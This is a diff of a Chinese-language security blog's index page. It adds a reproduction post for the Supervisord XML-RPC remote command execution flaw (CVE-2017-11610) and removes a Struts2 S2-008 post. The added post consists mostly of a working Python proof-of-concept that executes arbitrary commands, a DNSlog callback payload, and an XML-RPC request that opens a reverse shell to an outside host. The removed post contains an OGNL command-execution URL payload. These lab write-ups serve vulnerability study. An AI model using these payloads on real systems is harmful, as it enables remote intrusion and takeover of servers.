@@ -75,6 +75,56 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CVE-2017-11610-Supervisord远程命令执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/12/21/CVE-2017-11610-Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2020-12-21T05:34:55.000Z" itemprop="datePublished">2020-12-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/12/21/CVE-2017-11610-Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-11610 Supervisord远程命令执行漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Supervisord是使用Python开发的进程管理程序，Supervisord能够将命令行进程或服务变为后台运行的deamon(守护进程)。Supervisord拥有监控进程状态的功能，在进程异常退出时能够自动重启进程。<br>Supervisord在配置了Web接口后，服务器会启动一个XMLRPC服务器，端口号为 9001，利用本漏洞，在获取接口访问权限后，远程攻击者可利用发送一段精心构造的请求，导致可在服务器执行任意代码</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="直接用POC"><a href="#直接用POC" class="headerlink" title="直接用POC"></a>直接用POC</h3><p>启动镜像，访问镜像地址<br><img src="/2020/12/21/CVE-2017-11610-Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>有回显的POC脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import xmlrpc.client</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">target &#x3D; sys.argv[1]</span><br><span class="line">command &#x3D; sys.argv[2]</span><br><span class="line">with xmlrpc.client.ServerProxy(target) as proxy:</span><br><span class="line">    old &#x3D; getattr(proxy, &#39;supervisor.readLog&#39;)(0,0)</span><br><span class="line"></span><br><span class="line">    logfile &#x3D; getattr(proxy, &#39;supervisor.supervisord.options.logfile.strip&#39;)()</span><br><span class="line">    getattr(proxy, &#39;supervisor.supervisord.options.warnings.linecache.os.system&#39;)(&#39;&#123;&#125; | tee -a &#123;&#125;&#39;.format(command, logfile))</span><br><span class="line">    result &#x3D; getattr(proxy, &#39;supervisor.readLog&#39;)(0,0)</span><br><span class="line"></span><br><span class="line">    print(result[len(old):])</span><br></pre></td></tr></table></figure>
+<p>用脚本直接打</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py &quot;http:&#x2F;&#x2F;192.168.70.137:9001&#x2F;RPC2&quot; &quot;id&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/21/CVE-2017-11610-Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p>
+<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>先用Dnslog验证下有无回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;supervision.supervisord.options.warnings.linecache.os.system&lt;&#x2F;methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;string&gt;ping 8ykeju.dnslog.cn&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;param&gt;</span><br><span class="line">&lt;&#x2F;params&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/21/CVE-2017-11610-Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p>
+<p>接着构造反弹shell的POC，发包，nc监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;supervision.supervisord.options.execve&lt;&#x2F;methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;string&gt;&#x2F;usr&#x2F;bin&#x2F;python&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;param&gt;</span><br><span class="line">&lt;&#x2F;param&gt;</span><br><span class="line">&lt;array&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">&lt;value&gt;&lt;string&gt;python&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;value&gt;&lt;string&gt;-c&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;value&gt;&lt;string&gt;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;host&quot;,3366));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;data&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;&#x2F;param&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;struct&gt;</span><br><span class="line">&lt;&#x2F;struct&gt;</span><br><span class="line">&lt;&#x2F;param&gt;</span><br><span class="line">&lt;&#x2F;params&gt;</span><br><span class="line">&lt;&#x2F;methodCall&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://givemefivw.github.io/2020/12/21/CVE-2017-11610-Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o54a00034ga0h6ujhqr7" data-title="CVE-2017-11610 Supervisord远程命令执行漏洞" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/" class="article-date">
@@ -102,7 +152,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/" data-id="ckix3zwgk000934a0348y755i" data-title="CVE-2020-15227 PHP Framework nette callback RCE POC" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/" data-id="ckiy4o54n000a4ga050aec5cd" data-title="CVE-2020-15227 PHP Framework nette callback RCE POC" class="article-share-link">Share</a>
       
       
       
@@ -144,7 +194,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2020-17530-S2-061%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckix3zwgt000c34a02hhs746g" data-title="CVE-2020-17530 S2-061远程代码执行漏洞" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2020-17530-S2-061%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o54u000e4ga0cu6e7olm" data-title="CVE-2020-17530 S2-061远程代码执行漏洞" class="article-share-link">Share</a>
       
       
       
@@ -184,7 +234,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/" data-id="ckix3zwgu000d34a008ewbmmj" data-title="CVE-2020-26258andCVE-2020-26259 Xstream SSRFand任意文件删除POC" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2020-26258andCVE-2020-26259-Xstream-SSRFand%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4POC/" data-id="ckiy4o54w000f4ga03pgt1l28" data-title="CVE-2020-26258andCVE-2020-26259 Xstream SSRFand任意文件删除POC" class="article-share-link">Share</a>
       
       
       
@@ -229,7 +279,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckix3zwgi000734a0eb6a1nmf" data-title="CVE-2017-9791 Struts2 S2-048远程代码执行漏洞" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o54p000b4ga08xo1509e" data-title="CVE-2017-9791 Struts2 S2-048远程代码执行漏洞" class="article-share-link">Share</a>
       
       
       
@@ -270,7 +320,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2017-7494-Samba%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckix3zwgh000634a0fk487qkt" data-title="CVE-2017-7494 Samba远程命令执行漏洞" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2017-7494-Samba%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o54m00084ga0e72fdybq" data-title="CVE-2017-7494 Samba远程命令执行漏洞" class="article-share-link">Share</a>
       
       
       
@@ -319,7 +369,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2017-5638-Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EPOC/" data-id="ckix3zwgf000534a0aftt46hg" data-title="CVE-2017-5638 Struts2 S2-045远程代码执行漏洞POC" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2017-5638-Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EPOC/" data-id="ckiy4o54k00074ga02whk4wg0" data-title="CVE-2017-5638 Struts2 S2-045远程代码执行漏洞POC" class="article-share-link">Share</a>
       
       
       
@@ -364,7 +414,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckix3zwge000434a00z11bp0b" data-title="CVE-2017-4917 Spring WebFlow远程代码执行漏洞" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o54i00064ga0diud684c" data-title="CVE-2017-4917 Spring WebFlow远程代码执行漏洞" class="article-share-link">Share</a>
       
       
       
@@ -405,7 +455,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/" data-id="ckix3zwgd000334a00grh8mfq" data-title="CVE-2016-3081 Struts-032远程命令执行POC" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/" data-id="ckiy4o54d00044ga0cnpubedt" data-title="CVE-2016-3081 Struts-032远程命令执行POC" class="article-share-link">Share</a>
       
       
       
@@ -458,50 +508,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2014-3102-ElasticSearch%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckix3zwgc000234a0611nbol4" data-title="CVE-2014-3102 ElasticSearch命令执行漏洞" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-CVE-2012-0392-Struts2-008命令执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/12/20/CVE-2012-0392-Struts2-008%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2020-12-20T10:12:32.000Z" itemprop="datePublished">2020-12-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/20/CVE-2012-0392-Struts2-008%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2012-0392 Struts2-008命令执行漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>S2-008</code>涉及多个漏洞，<code>Cookie</code>拦截器错误配置可造成<code>OGNL</code>表达式执行，但是由于大多Web容器(如Tomcat)对<code>Cookie</code>名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在<code>struts2</code>应用开启<code>devMode</code>模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如kxlzx所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了<code>debug</code>模式的应用到服务器上作为后门也是有可能的</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>利用对传入参数没有严格限制，导致多个地方可以执行任意代码。<br>第一种情况其实就是<code>S2-007</code>，在异常处理时的<code>OGNL</code>执行第二种的 <code>cookie</code>的方式，虽然在<code>struts2</code>没有对恶意代码进行限制，但是<code>java</code>的<code>webserver（Tomcat）</code>，对<code>cookie</code>的名称有较多限制，在传入<code>struts2</code>之前就被处理，从而较为鸡肋第三种需要开启<code>devModedebug</code>模式，例如在<code>devMode</code>模式下直接添加参数<br><code>?debug=command&amp;expression=</code>会直接执行后面的<code>OGNL</code>表达式.</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>启动靶场</p>
-<p>POC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;devmode.action?debug&#x3D;command&amp;expression&#x3D;%28%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28&quot;false&quot;%29%20%2C%23context%5B&quot;xwork.MethodAccessor.denyMethodExecution&quot;%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%29</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2012-0392-Struts2-008%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckix3zwga000134a02aafbkqy" data-title="CVE-2012-0392 Struts2-008命令执行漏洞" class="article-share-link">Share</a>
+      <a data-url="https://givemefivw.github.io/2020/12/20/CVE-2014-3102-ElasticSearch%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckiy4o54400014ga07nz1163l" data-title="CVE-2014-3102 ElasticSearch命令执行漏洞" class="article-share-link">Share</a>
       
       
       
@@ -531,7 +538,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/POC/" rel="tag">POC</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/POC/" rel="tag">POC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li></ul>
     </div>
   </div>
 
@@ -541,7 +548,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/POC/" style="font-size: 10px;">POC</a>
+      <a href="/tags/POC/" style="font-size: 10px;">POC</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a>
     </div>
   </div>
 
@@ -563,6 +570,10 @@
       <ul>
         
           <li>
+            <a href="/2020/12/21/CVE-2017-11610-Supervisord%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-11610 Supervisord远程命令执行漏洞</a>
+          </li>
+        
+          <li>
             <a href="/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/">CVE-2020-15227 PHP Framework nette callback RCE POC</a>
           </li>
         
@@ -576,10 +587,6 @@
         
           <li>
             <a href="/2020/12/20/CVE-2017-9791-Struts2-S2-048%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-9791 Struts2 S2-048远程代码执行漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/20/CVE-2017-7494-Samba%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-7494 Samba远程命令执行漏洞</a>
           </li>
         
       </ul>
